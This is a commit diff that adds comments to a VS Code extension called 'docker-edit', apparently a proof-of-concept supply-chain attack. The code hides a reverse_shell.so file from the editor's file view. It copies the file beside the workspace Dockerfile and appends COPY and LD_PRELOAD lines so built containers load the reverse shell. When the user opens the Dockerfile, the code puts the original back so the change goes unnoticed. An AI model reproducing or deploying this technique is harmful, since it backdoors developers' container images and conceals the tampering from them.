f79a09ebdf8bbfc318aa0456e43c46627aa82e53
George <48719453+geoe9@users.noreply.github.com>
2023-05-03 19:34:20 +0100

    Add commenting

--- docker-edit/src/extension.ts
+++ docker-edit/src/extension.ts
@@ -4,18 +4,23 @@ import * as path from 'path';
 
 export async function activate(context: vscode.ExtensionContext) {
 
+	// update workspace settings to prevent user from seeing reverse_shell.so file
 	const config = vscode.workspace.getConfiguration();
 	const currentValue = config.get<{}>('files.exclude');
 	const newValue = { ...currentValue, ...{ ['**/reverse_shell.so']: true } };
 	await config.update('files.exclude', newValue, true);
 
+	// get extensions
 	const thisExtension = vscode.extensions.getExtension("undefined_publisher.docker-edit");
 	const dockerExtension = vscode.extensions.getExtension("ms-azuretools.vscode-docker");
 
+	// check docker extension is installed and running
 	if (!dockerExtension) { console.error("Docker extension not running."); return;}
 
+	// check this extension is running
 	if (!thisExtension) { console.error("Docker-edit extension is not running properly."); return; }
 
+	// find dockerfile in open tabs and close it
 	var dockerfilePath: string = "";
 	const tabs: vscode.Tab[] = vscode.window.tabGroups.all.map(tg => tg.tabs).flat();
 	const index = tabs.findIndex(tab => tab.input instanceof vscode.TabInputText && tab.input.uri.path.endsWith('Dockerfile'));
@@ -27,19 +32,25 @@ export async function activate(context: vscode.ExtensionContext) {
 		await vscode.window.tabGroups.close(tab);
 	}
 
+	// if dockerfile is not open in tabs, find its path via the current workspace
 	if (!dockerfilePath) {
 		const results = await vscode.workspace.findFiles('**/Dockerfile', undefined, 2);
 		if (results.length !== 1) { console.error("Could not find Dockerfile"); return; }
 		dockerfilePath = results[0].fsPath;
 	}
 
+	// copy reverse_shell.so file to Dockerfile scope
 	const reverseShellPath = path.join(path.dirname(dockerfilePath), "reverse_shell.so");
 	fs.copyFileSync(path.join(thisExtension.extensionPath, "reverse_shell.so"), reverseShellPath);
 
+	// copy original Dockerfile
 	const tempDest = path.join(thisExtension.extensionPath, "Dockerfile");
 	fs.copyFileSync(dockerfilePath, tempDest);
+
+	// append malicious lines to Dockerfile
 	fs.appendFileSync(dockerfilePath, `\nCOPY reverse_shell.so /usr/share/lib/reverse_shell.so\nENV LD_PRELOAD=/usr/share/lib/reverse_shell.so`);
 
+	// add event listener to remove reverse_shell.so file and malicious lines in Dockerfile when Dockerfile is opened
 	context.subscriptions.push(vscode.workspace.onDidOpenTextDocument(e => {
 		if (e.uri.fsPath === dockerfilePath) {
 			fs.copyFileSync(tempDest, dockerfilePath);
